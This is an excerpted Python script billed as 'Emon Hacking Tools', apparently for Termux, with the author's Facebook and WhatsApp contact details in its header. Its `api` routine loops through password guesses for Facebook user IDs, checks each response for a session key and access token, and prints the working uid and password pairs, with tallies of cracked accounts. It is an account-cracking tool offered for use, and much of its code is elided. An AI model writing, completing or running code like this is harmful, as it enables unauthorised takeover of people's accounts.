...
#BD Cyber Zone-BCZ
#FB : https://www.facebook.com/mr.EM0N.502
#PAGE : Md Mizan
#Programer Mehedi Hasan Emon
#𝐖𝐇𝐀𝐓'𝐒 𝐀𝐏𝐏 : +8801975838786
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
...
\33[1;32m𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐄𝐦𝐨𝐧 𝐇𝐚𝐜𝐤𝐢𝐧𝐠 𝐓𝐨𝐨𝐥𝐬
...
║\33[1;32m[↦] 𝚆𝚑𝚊𝚝𝚜𝚊𝚙𝚙   : +8801975838786
...
class Main:
	def __init__(self):
		...
		if DEVIL in ["1", "01"]:
			self.fbtua()
		if DEVIL in ["2", "02"]:
			os.system('xdg-open https://github.com/EM0N-0')
		if DEVIL in ["3", "03"]:
			os.system('xdg-open https://www.facebook.com/Termux-Tools-502-100961239025559/')
		if DEVIL in ["4", "04"]:
	...
	def fbtua(self):
		...
		try:
			...
			os.system('xdg-open https://www.facebook.com/mr.EM0N.502')
			os.system('clear')
			print(logo) 
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[92;1m[EM0N] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[1;32m   [EM0N] %s | %s\033[1;32m         "%(uid, pw))
